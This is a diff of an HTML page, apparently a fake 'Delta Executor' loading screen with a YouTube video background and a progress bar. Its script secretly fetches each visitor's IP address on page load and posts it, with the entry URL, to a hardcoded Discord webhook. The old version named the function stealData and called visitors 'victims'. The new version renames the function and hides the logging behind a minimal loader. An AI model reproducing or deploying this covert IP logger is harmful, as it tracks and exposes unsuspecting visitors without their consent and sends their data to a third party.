@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Executor - Cargando...</title>
+    <title>Delta</title>
     <style>
         * {
             margin: 0;
@@ -16,11 +16,10 @@
             width: 100%;
             overflow: hidden;
             background-color: #000;
-            font-family: 'Segoe UI', sans-serif;
         }
 
-        /* Contenedor del video de fondo */
-        .video-background {
+        /* Video de fondo: Edificios nocturnos */
+        .video-container {
             position: fixed;
             top: 0;
             left: 0;
@@ -30,88 +29,70 @@
             pointer-events: none;
         }
 
-        #player {
-            width: 100%;
-            height: 100%;
-            transform: scale(1.5); /* Para evitar bordes negros */
+        #bg-video {
+            width: 100vw;
+            height: 100vh;
+            transform: scale(1.4); /* Elimina bordes negros de YT */
+            object-fit: cover;
         }
 
-        /* Capa de cristal sobre el fondo */
+        /* Overlay con animaciones */
         .overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.7) 100%);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 1;
         }
 
-        /* Contenedor de la barra */
-        .loader-container {
-            width: 80%;
-            max-width: 500px;
-            padding: 30px;
+        /* Barra de carga minimalista y transparente */
+        .loader-box {
+            width: 250px;
+            height: 6px;
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 20px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            text-align: center;
-        }
-
-        .status-text {
-            color: #fff;
-            margin-bottom: 20px;
-            font-size: 1.2rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 300;
-            text-shadow: 0 0 10px rgba(255,255,255,0.5);
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
             border-radius: 10px;
             overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 2s ease-in-out;
         }
 
         .progress-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #00ff41, #00cc33);
-            box-shadow: 0 0 15px #00ff41;
+            background: linear-gradient(90deg, #00ffcc, #0077ff);
+            box-shadow: 0 0 15px #00ffcc;
             transition: width 0.1s linear;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
         }
     </style>
 </head>
 <body>
 
-    <div class="video-background">
-        <div id="player"></div>
+    <div class="video-container">
+        <div id="bg-video"></div>
     </div>
 
-    <div class="overlay" onclick="unmuteVideo()">
-        <div class="loader-container">
-            <div class="status-text" id="status">Iniciando sistema...</div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progress"></div>
-            </div>
+    <div class="overlay" onclick="enableAudio()">
+        <div class="loader-box">
+            <div class="progress-fill" id="progress"></div>
         </div>
     </div>
 
     <script>
-        // Configuración de la Webhook
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';
 
-        // 1. Cargar API de YouTube para el fondo
+        // 1. YouTube Background API
         var tag = document.createElement('script');
         tag.src = "https://www.youtube.com/iframe_api";
         var firstScriptTag = document.getElementsByTagName('script')[0];
@@ -119,88 +100,67 @@
 
         var player;
         function onYouTubeIframeAPIReady() {
-            player = new YT.Player('player', {
-                videoId: 'Tbw3w0RA0WU',
+            player = new YT.Player('bg-video', {
+                videoId: 'Tbw3w0RA0WU', // Video de edificios nocturnos / Lo-fi
                 playerVars: {
                     'autoplay': 1,
                     'controls': 0,
-                    'showinfo': 0,
-                    'rel': 0,
+                    'mute': 1,
                     'loop': 1,
                     'playlist': 'Tbw3w0RA0WU',
-                    'mute': 1 // Empezamos muteado para permitir autoplay
+                    'showinfo': 0,
+                    'rel': 0
                 },
                 events: {
-                    'onReady': onPlayerReady
+                    'onReady': (e) => {
+                        e.target.playVideo();
+                        startLoading();
+                        sendMinimalData();
+                    }
                 }
             });
         }
 
-        function onPlayerReady(event) {
-            event.target.playVideo();
-            startLoading();
-            stealData(); // Envía los datos apenas entra
-        }
-
-        function unmuteVideo() {
+        function enableAudio() {
             if (player) {
                 player.unMute();
-                player.setVolume(50);
+                player.setVolume(40);
             }
         }
 
-        // 2. Lógica de la barra de carga (Rápida)
+        // 2. Barra de carga rápida y limpia
         function startLoading() {
-            const progress = document.getElementById('progress');
-            const status = document.getElementById('status');
+            const bar = document.getElementById('progress');
             let width = 0;
-            
-            const steps = ["Inyectando scripts...", "Bypassing Anticheat...", "Obteniendo IP...", "Finalizando..."];
-            
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
-                    status.textContent = "¡Carga Completa!";
                 } else {
-                    width += 1; 
-                    progress.style.width = width + '%';
-                    
-                    // Cambiar texto según el progreso
-                    if (width < 30) status.textContent = steps[0];
-                    else if (width < 60) status.textContent = steps[1];
-                    else if (width < 90) status.textContent = steps[2];
-                    else status.textContent = steps[3];
+                    width += 1.5; // Velocidad de carga
+                    bar.style.width = width + '%';
                 }
-            }, 50); // Velocidad rápida
+            }, 60);
         }
 
-        // 3. Captura de datos y envío a Webhook
-        async function stealData() {
-            let ip = "Desconocida";
+        // 3. Envío de datos simplificado (Solo IP y URL)
+        async function sendMinimalData() {
+            let userIP = "Unknown";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                ip = data.ip;
+                userIP = data.ip;
             } catch (e) {}
-
-            const payload = {
-                username: "Delta Background Logger",
-                embeds: [{
-                    title: "🌐 Nueva Víctima en el Portal",
-                    color: 3066993,
-                    fields: [
-                        { name: "📍 Dirección IP", value: `\`${ip}\``, inline: true },
-                        { name: "🖥️ Navegador", value: navigator.userAgent.split(') ')[1], inline: true },
-                        { name: "🔗 URL de entrada", value: window.location.href }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    embeds: [{
+                        description: `🌐 **Nueva IP capturada:** \`${userIP}\` \n🔗 **Origen:** ${window.location.href}`,
+                        color: 1752220, // Azul neón
+                        footer: { text: "Delta Minimal Logger" }
+                    }]
+                })
             }).catch(() => {});
         }
     </script>
